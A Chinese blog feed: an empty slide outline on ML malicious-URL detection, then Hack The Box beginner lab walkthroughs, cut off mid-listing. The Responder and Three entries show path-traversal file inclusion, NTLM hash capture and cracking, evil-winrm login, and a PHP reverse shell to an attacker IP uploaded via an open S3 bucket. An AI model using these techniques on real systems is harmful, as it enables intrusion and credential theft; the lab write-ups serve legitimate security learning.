    <content type="html"><![CDATA[<h1 id="Malicious-URL-Detection"><a href="#Malicious-URL-Detection" class="headerlink" title="Malicious-URL-Detection"></a>Malicious-URL-Detection</h1><p>实验 PPT 框架</p><h2 id="恶意-URL-介绍"><a href="#恶意-URL-介绍" class="headerlink" title="恶意 URL 介绍"></a>恶意 URL 介绍</h2><h3 id="恶意-URL-的定义"><a href="#恶意-URL-的定义" class="headerlink" title="恶意 URL 的定义"></a>恶意 URL 的定义</h3><h3 id="恶意-URL-的类型"><a href="#恶意-URL-的类型" class="headerlink" title="恶意 URL 的类型"></a>恶意 URL 的类型</h3><h3 id="恶意-URL-的传播方式"><a href="#恶意-URL-的传播方式" class="headerlink" title="恶意 URL 的传播方式"></a>恶意 URL 的传播方式</h3><p><img src="/pic/597819fa1f10581428322eb024a2beb8_1_Figure_1_151912335.png"></p><h3 id="恶意-URL-举例"><a href="#恶意-URL-举例" class="headerlink" title="恶意 URL 举例"></a>恶意 URL 举例</h3><h2 id="恶意-URL-的检测思路"><a href="#恶意-URL-的检测思路" class="headerlink" title="恶意 URL 的检测思路"></a>恶意 URL 的检测思路</h2><h2 id="SVM-详解"><a href="#SVM-详解" class="headerlink" title="SVM 详解"></a>SVM 详解</h2><h2 id="其他基于机器学习的恶意-URL-检测"><a href="#其他基于机器学习的恶意-URL-检测" class="headerlink" title="其他基于机器学习的恶意 URL 检测"></a>其他基于机器学习的恶意 URL 检测</h2><blockquote><p>Detecting Malicious URLs using Machine Learning Techniques</p></blockquote><h3 id="方法与原理详解"><a href="#方法与原理详解" class="headerlink" title="方法与原理详解"></a>方法与原理详解</h3><h3 id="实验结果的对比"><a href="#实验结果的对比" class="headerlink" title="实验结果的对比"></a>实验结果的对比</h3><h2 id="近几年的相关论文与研究趋势"><a href="#近几年的相关论文与研究趋势" class="headerlink" title="近几年的相关论文与研究趋势"></a>近几年的相关论文与研究趋势</h2><h2 id="实验与结果展示"><a href="#实验与结果展示" class="headerlink" title="实验与结果展示"></a>实验与结果展示</h2><h3 id="实验环境与数据集"><a href="#实验环境与数据集" class="headerlink" title="实验环境与数据集"></a>实验环境与数据集</h3><h3 id="SVM-实验流程图"><a href="#SVM-实验流程图" class="headerlink" title="SVM 实验流程图"></a>SVM 实验流程图</h3><h3 id="实验指标"><a href="#实验指标" class="headerlink" title="实验指标"></a>实验指标</h3><h3 id="实验与部分代码展示"><a href="#实验与部分代码展示" class="headerlink" title="实验与部分代码展示"></a>实验与部分代码展示</h3><h3 id="与逻辑回归方法的实验对比"><a href="#与逻辑回归方法的实验对比" class="headerlink" title="与逻辑回归方法的实验对比"></a>与逻辑回归方法的实验对比</h3>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Start_Point</title>
    <link href="/2023/05/0ec9b4c0392c.html"/>
    <url>/2023/05/0ec9b4c0392c.html</url>
    
    <content type="html"><![CDATA[<p>HTB 的 Very easy 靶机，用来帮助熟悉 Hack The Box 的基础操作和一些靶机的基础环节设置，以及一些基础知识的补充</p><h1 id="Start-Point"><a href="#Start-Point" class="headerlink" title="Start Point"></a>Start Point</h1><h2 id="Web-Nmap-smb"><a href="#Web-Nmap-smb" class="headerlink" title="Web_Nmap_smb"></a>Web_Nmap_smb</h2><h2 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis_cli"></a>redis_cli</h2><p>How to install redis-cli? redis-cli could be installed by <code>sudo apt-get install redis-tools</code> which contains redis-cli.After we connect redis server, <code>INFO</code> will help us to get the information about database. Beside, <code>keys *</code> could get all keys and <code>get &#39;key&#39;</code> could get value of key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/usr]<br>└─$ redis-cli -h<br>redis-cli 7.0.11<br><br>Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]<br>  -h &lt;hostname&gt;      Server hostname (default: 127.0.0.1).<br>  -p &lt;port&gt;          Server port (default: 6379).<br>  -s &lt;socket&gt;        Server socket (overrides hostname and port).<br>  -a &lt;password&gt;      Password to use when connecting to the server.<br>                     You can also use the REDISCLI_AUTH environment<br>                     variable to pass this password more safely<br>                     (<span class="hljs-keyword">if</span> both are used, this argument takes precedence).<br>  --user &lt;username&gt;  Used to send ACL style <span class="hljs-string">&#x27;AUTH username pass&#x27;</span>. Needs -a.<br>  --pass &lt;password&gt;  Alias of -a <span class="hljs-keyword">for</span> consistency with the new --user option.<br>  --askpass          Force user to input password with mask from STDIN.<br>                     If this argument is used, <span class="hljs-string">&#x27;-a&#x27;</span> and REDISCLI_AUTH<br>                     environment variable will be ignored.<br>  -u &lt;uri&gt;           Server URI.<br>  -r &lt;repeat&gt;        Execute specified <span class="hljs-built_in">command</span> N <span class="hljs-built_in">times</span>.<br>  -i &lt;interval&gt;      When -r is used, waits &lt;interval&gt; seconds per <span class="hljs-built_in">command</span>.<br>                     It is possible to specify sub-second <span class="hljs-built_in">times</span> like -i 0.1.<br>                     This interval is also used <span class="hljs-keyword">in</span> --scan and --<span class="hljs-built_in">stat</span> per cycle.<br>                     and <span class="hljs-keyword">in</span> --bigkeys, --memkeys, and --hotkeys per 100 cycles.<br>  -n &lt;db&gt;            Database number.<br>  -2                 Start session <span class="hljs-keyword">in</span> RESP2 protocol mode.<br>  -3                 Start session <span class="hljs-keyword">in</span> RESP3 protocol mode.<br>  -x                 Read last argument from STDIN (see example below).<br>  -X                 Read &lt;tag&gt; argument from STDIN (see example below).<br>  -d &lt;delimiter&gt;     Delimiter between response bulks <span class="hljs-keyword">for</span> raw formatting (default: \n).<br>  -D &lt;delimiter&gt;     Delimiter between responses <span class="hljs-keyword">for</span> raw formatting (default: \n).<br>  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).<br>  -e                 Return <span class="hljs-built_in">exit</span> error code when <span class="hljs-built_in">command</span> execution fails.<br>  --tls              Establish a secure TLS connection.<br>  --sni &lt;host&gt;       Server name indication <span class="hljs-keyword">for</span> TLS.<br>  --cacert &lt;file&gt;    CA Certificate file to verify with.<br>  --cacertdir &lt;<span class="hljs-built_in">dir</span>&gt;  Directory <span class="hljs-built_in">where</span> trusted CA certificates are stored.<br>                     If neither cacert nor cacertdir are specified, the default<br>                     system-wide trusted root certs configuration will apply.<br>  --insecure         Allow insecure TLS connection by skipping cert validation.<br>  --cert &lt;file&gt;      Client certificate to authenticate with.<br>  --key &lt;file&gt;       Private key file to authenticate with.<br>  --tls-ciphers &lt;list&gt; Sets the list of preferred ciphers (TLSv1.2 and below)<br>                     <span class="hljs-keyword">in</span> order of preference from highest to lowest separated by colon (<span class="hljs-string">&quot;:&quot;</span>).<br>                     See the ciphers(1ssl) manpage <span class="hljs-keyword">for</span> more information about the syntax of this string.<br>  --tls-ciphersuites &lt;list&gt; Sets the list of preferred ciphersuites (TLSv1.3)<br>                     <span class="hljs-keyword">in</span> order of preference from highest to lowest separated by colon (<span class="hljs-string">&quot;:&quot;</span>).<br>                     See the ciphers(1ssl) manpage <span class="hljs-keyword">for</span> more information about the syntax of this string,<br>                     and specifically <span class="hljs-keyword">for</span> TLSv1.3 ciphersuites.<br>  --raw              Use raw formatting <span class="hljs-keyword">for</span> replies (default when STDOUT is<br>                     not a <span class="hljs-built_in">tty</span>).<br>  --no-raw           Force formatted output even when STDOUT is not a <span class="hljs-built_in">tty</span>.<br>  --quoted-input     Force input to be handled as quoted strings.<br>  --csv              Output <span class="hljs-keyword">in</span> CSV format.<br>  --json             Output <span class="hljs-keyword">in</span> JSON format (default RESP3, use -2 <span class="hljs-keyword">if</span> you want to use with RESP2).<br>  --quoted-json      Same as --json, but produce ASCII-safe quoted strings, not Unicode.<br>  --show-pushes &lt;yn&gt; Whether to <span class="hljs-built_in">print</span> RESP3 PUSH messages.  Enabled by default when<br>                     STDOUT is a <span class="hljs-built_in">tty</span> but can be overridden with --show-pushes no.<br>  --<span class="hljs-built_in">stat</span>             Print rolling stats about server: mem, clients, ...<br>  --latency          Enter a special mode continuously sampling latency.<br>                     If you use this mode <span class="hljs-keyword">in</span> an interactive session it runs<br>                     forever displaying real-time stats. Otherwise <span class="hljs-keyword">if</span> --raw or<br>                     --csv is specified, or <span class="hljs-keyword">if</span> you redirect the output to a non<br>                     TTY, it samples the latency <span class="hljs-keyword">for</span> 1 second (you can use<br>                     -i to change the interval), <span class="hljs-keyword">then</span> produces a single output<br>                     and exits.<br>  --latency-history  Like --latency but tracking latency changes over time.<br>                     Default time interval is 15 sec. Change it using -i.<br>  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.<br>                     Default time interval is 1 sec. Change it using -i.<br>  --lru-test &lt;keys&gt;  Simulate a cache workload with an 80-20 distribution.<br>  --replica          Simulate a replica showing commands received from the master.<br>  --rdb &lt;filename&gt;   Transfer an RDB dump from remote server to <span class="hljs-built_in">local</span> file.<br>                     Use filename of <span class="hljs-string">&quot;-&quot;</span> to write to stdout.<br> --functions-rdb &lt;filename&gt; Like --rdb but only get the <span class="hljs-built_in">functions</span> (not the keys)<br>                     when getting the RDB dump file.<br>  --pipe             Transfer raw Redis protocol from stdin to server.<br>  --pipe-timeout &lt;n&gt; In --pipe mode, abort with error <span class="hljs-keyword">if</span> after sending all data.<br>                     no reply is received within &lt;n&gt; seconds.<br>                     Default <span class="hljs-built_in">timeout</span>: 30. Use 0 to <span class="hljs-built_in">wait</span> forever.<br>  --bigkeys          Sample Redis keys looking <span class="hljs-keyword">for</span> keys with many elements (complexity).<br>  --memkeys          Sample Redis keys looking <span class="hljs-keyword">for</span> keys consuming a lot of memory.<br>  --memkeys-samples &lt;n&gt; Sample Redis keys looking <span class="hljs-keyword">for</span> keys consuming a lot of memory.<br>                     And define number of key elements to sample<br>  --hotkeys          Sample Redis keys looking <span class="hljs-keyword">for</span> hot keys.<br>                     only works when maxmemory-policy is *lfu.<br>  --scan             List all keys using the SCAN <span class="hljs-built_in">command</span>.<br>  --pattern &lt;pat&gt;    Keys pattern when using the --scan, --bigkeys or --hotkeys<br>                     options (default: *).<br>  --quoted-pattern &lt;pat&gt; Same as --pattern, but the specified string can be<br>                         quoted, <span class="hljs-keyword">in</span> order to pass an otherwise non binary-safe string.<br>  --intrinsic-latency &lt;sec&gt; Run a <span class="hljs-built_in">test</span> to measure intrinsic system latency.<br>                     The <span class="hljs-built_in">test</span> will run <span class="hljs-keyword">for</span> the specified amount of seconds.<br>  --<span class="hljs-built_in">eval</span> &lt;file&gt;      Send an EVAL <span class="hljs-built_in">command</span> using the Lua script at &lt;file&gt;.<br>  --ldb              Used with --<span class="hljs-built_in">eval</span> <span class="hljs-built_in">enable</span> the Redis Lua debugger.<br>  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, <span class="hljs-keyword">in</span><br>                     this mode the server is blocked and script changes are<br>                     not rolled back from the server memory.<br>  --cluster &lt;<span class="hljs-built_in">command</span>&gt; [args...] [opts...]<br>                     Cluster Manager <span class="hljs-built_in">command</span> and arguments (see below).<br>  --verbose          Verbose mode.<br>  --no-auth-warning  Don\<span class="hljs-string">&#x27;t show warning message when using password on command</span><br><span class="hljs-string">                     line interface.</span><br><span class="hljs-string">  --help             Output this help and exit.</span><br><span class="hljs-string">  --version          Output version and exit.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Cluster Manager Commands:</span><br><span class="hljs-string">  Use --cluster help to list all available cluster manager commands.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Examples:</span><br><span class="hljs-string">  cat /etc/passwd | redis-cli -x set mypasswd</span><br><span class="hljs-string">  redis-cli -D &quot;&quot; --raw dump key &gt; key.dump &amp;&amp; redis-cli -X dump_tag restore key2 0 dump_tag replace &lt; key.dump</span><br><span class="hljs-string">  redis-cli -r 100 lpush mylist x</span><br><span class="hljs-string">  redis-cli -r 100 -i 1 info | grep used_memory_human:</span><br><span class="hljs-string">  redis-cli --quoted-input set &#x27;</span><span class="hljs-string">&quot;null-\x00-separated&quot;</span><span class="hljs-string">&#x27; value</span><br><span class="hljs-string">  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3</span><br><span class="hljs-string">  redis-cli --scan --pattern &#x27;</span>*:12345*<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)</span><br><span class="hljs-string"></span><br><span class="hljs-string">When no command is given, redis-cli starts in interactive mode.</span><br><span class="hljs-string">Type &quot;help&quot; in interactive mode for information on available commands</span><br><span class="hljs-string">and settings.</span><br></code></pre></td></tr></table></figure><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.237.187<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 03:00 EDT<br>Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 47.32% <span class="hljs-keyword">done</span>; ETC: 03:00 (0:00:10 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> unika.htb (10.129.237.187)<br>Host is up (0.20s latency).<br>Not shown: 65532 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>5985/tcp open  wsman<br>7680/tcp open  pando-pub<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 27.09 seconds<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap -sT -sV -sC -p80,5985,7680 10.129.237.187<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 03:02 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> unika.htb (10.129.237.187)<br>Host is up (0.067s latency).<br><br>PORT     STATE SERVICE    VERSION<br>80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>m PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span>)<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> (Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>m PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span><br>|_http-title: Unika<br><span class="hljs-number">5985</span>/tcp open  http       Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/<span class="hljs-number">2.0</span><br>|_http-title: Not Found<br><span class="hljs-number">7680</span>/tcp open  pando-pub?<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">49.15</span> seconds<br></code></pre></td></tr></table></figure><blockquote><p>Windows远程管理（<strong>WinRM默认运行在5985端口</strong>），是一个Windows本地内置的远程管理协议，基本上使用简单对象访问协议与远程计算机和服务器交互，以及操作系统和应用程序。</p></blockquote><p>在浏览器中，访问 IP 发现被重定向到了 unika.htb，于是在&#x2F;etc&#x2F;hosts 文件中添加 <code>IP    unika.htb</code> 的对应，这样我们就可以直接访问 unika.htb 页面了，发现页面中很多都是锚点，在切换语言的位置发现</p><p>![[pic&#x2F;Pasted image 20230601161307.png]]</p><h3 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h3><p>看到这个 URL，应当考虑是否存在本地文件包含和远程文件包含漏洞，我们构造 <code>…/…/…/…/…/…/…/…/windows/system32/drivers/etc/hosts</code> 将其作为 page 参数的值</p><p><img src="/pic/fc05c139718a4a6061e71a80aef3fa86_MD5.png"></p><p>发现的确存在本地包含漏洞，接下来尝试是否存在远程文件包含漏洞，因为前面已经确定了是 Windows 的机器（nmap 扫描），所以接下来我们将使用 Responder 来获取 NTLM 的值</p><blockquote><p>在PHP配置文件PHP.ini中:<br>“allow_url_include”默认设置为“Off”,PHP不加载远程HTTP或FTP,url以防止远程文件包含攻击。<br>然而，即使allow_url_include和allow_url_fopen被设置为“Off”，PHP也不会阻止加载SMB url。<br>我们可以误用这个功能来窃取NTLM哈希</p></blockquote><blockquote><p>Responder 可以进行许多不同类型的攻击，但对于这个场景，它将设置为一个恶意的 SMB 服务器。<br>当目标机器试图对该服务器执行NTLM身份验证时，Responder向服务器发送一个请求，要求服务器用用户的密码加密。当服务器响应时，Responder将使用质询和加密的响应来生成NetNTLMv2（NetNTLMv2质询&#x2F;响应是一个特定格式化的字符串，包括质询和响应。）而我们不能逆转在NetNTLMv2中，我们可以尝试许多不同的常见密码，以查看是否有任何密码生成相同的质询响应，如果找到了，我们就知道这就是密码。这通常被称为散列破解，我们将使用一个名为“John The Ripper”的程序来实现。</p></blockquote><h3 id="Responder-获取-NTLM-认证中的密码哈希值"><a href="#Responder-获取-NTLM-认证中的密码哈希值" class="headerlink" title="Responder 获取 NTLM 认证中的密码哈希值"></a>Responder 获取 NTLM 认证中的密码哈希值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./Responder.py -I tun0<br></code></pre></td></tr></table></figure><p><img src="/pic/b490fa3df62dc473cf990cb09c07a0a4_MD5.png"></p><p>接下来我们复制以上内容使用 john 进行破解操作</p><p><img src="/pic/02ec82807fa1d834a2cc601bb37ac57d_MD5.png"></p><p>最后使用 evil-winrm 来连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">evil-winrm -i IP -u administrator -p badminton<br></code></pre></td></tr></table></figure><p>最后在 mike 的桌面找到了 flag</p><h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><p>Three is a Linux box that includes a website, which utilizes an AWS S3 bucket as its cloud-storage device. We can exploit this poorly configured S3 bucket and upload a reverse shell on it. We can then visit the corresponding URL to execute the reverse file and ultimately retrieve the flag.</p><p>基础的信息收集发现，在 CONTACT 中有一个邮箱地址，邮箱的后缀使用的是 thetoppers.htb，我们把 thetoppers.htb 和 IP 的对应写入 hosts 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 10.129.227.248<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 22:00 EDT<br>Warning: 10.129.227.248 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.227.248<br>Host is up (0.020s latency).<br>Not shown: 65284 closed tcp ports (reset), 249 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.96 seconds<br></code></pre></td></tr></table></figure><p>尝试子域名爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u thetoppers.htb -H <span class="hljs-string">&quot;Host:FUZZ.thetoppers.htb&quot;</span> --hw 1036<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://thetoppers.htb/</span><br><span class="hljs-string">Total requests: 5000</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload</span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000247:   404        0 L      2 W        21 Ch       &quot;s3&quot;</span><br><span class="hljs-string">000000690:   400        10 L     35 W       306 Ch      &quot;gc._msdcs&quot;</span><br><span class="hljs-string">000002700:   400        10 L     35 W       306 Ch      &quot;m.&quot;</span><br><span class="hljs-string">000002795:   400        10 L     35 W       306 Ch      &quot;ns2.cl.bellsouth.net.&quot;</span><br><span class="hljs-string">000002883:   400        10 L     35 W       306 Ch      &quot;ns1.viviotech.net.&quot;</span><br><span class="hljs-string">000002885:   400        10 L     35 W       306 Ch      &quot;ns2.viviotech.net.&quot;</span><br><span class="hljs-string">000003050:   400        10 L     35 W       306 Ch      &quot;ns3.cl.bellsouth.net.&quot;</span><br><span class="hljs-string">^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 3066</span><br><span class="hljs-string">Filtered Requests: 3059</span><br><span class="hljs-string">Requests/sec.: 0</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>得到一个 s3 的子域名，虽然返回的是 404，但是也应当引起注意，借助于谷歌搜索发现，s3 是亚马逊的存储服务，然后把 s3.thetoppers.htb 和 IP 的对应也写入 hosts 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ curl s3.thetoppers.htb<br>&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;running&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们需要借助于工具 awscli 来和 s3.thetoppers.htb 进行交互。通过 apt-get 安装完 awscli（或者 aws）之后首先应当使用 aws configure 进行参数的配置（随便写就行），这样我们才能和目标进行交互。</p><p>使用 <code>aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb </code> 来列出所有的存储对象</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ aws s3 <span class="hljs-built_in">cp</span> <span class="hljs-built_in">hash</span> s3://s3.thetoppers.htb/<br>upload failed: ./hash to s3://s3.thetoppers.htb/hash Could not connect to the endpoint URL: <span class="hljs-string">&quot;https://s3.temp.amazonaws.com/s3.thetoppers.htb/hash&quot;</span><br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">ls</span>  s3://thetoppers.htb<br>                           PRE images/<br>2023-06-01 22:17:08          0 .htaccess<br>2023-06-01 22:17:08      11952 index.php<br></code></pre></td></tr></table></figure><p>既然如此，接下来我们就使用 cp 命令借助于 aws s3 的机制来实现文件上传。一开始上传了这样的反向 shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.128/1234 0&gt;&amp;1&#x27;&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是出现了问题：连接上之后就立马断开了，再尝试尝试经典的 php 反向 shell 吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ <span class="hljs-built_in">cp</span> /usr/share/webshells/php/php-reverse-shell.php ./<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ vim  php-reverse-shell.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> php-reverse-shell.php s3://thetoppers.htb<br>upload: ./php-reverse-shell.php to s3://thetoppers.htb/php-reverse-shell.php<br><br>┌──(i3eg1nner㉿minilite)-[~]<br>└─$ aws --endpoint=http://s3.thetoppers.htb s3 <span class="hljs-built_in">ls</span> s3://thetoppers.htb<br>                           PRE images/<br>2023-06-01 22:17:08          0 .htaccess<br>2023-06-01 22:17:08      11952 index.php<br>2023-06-01 23:32:09       5494 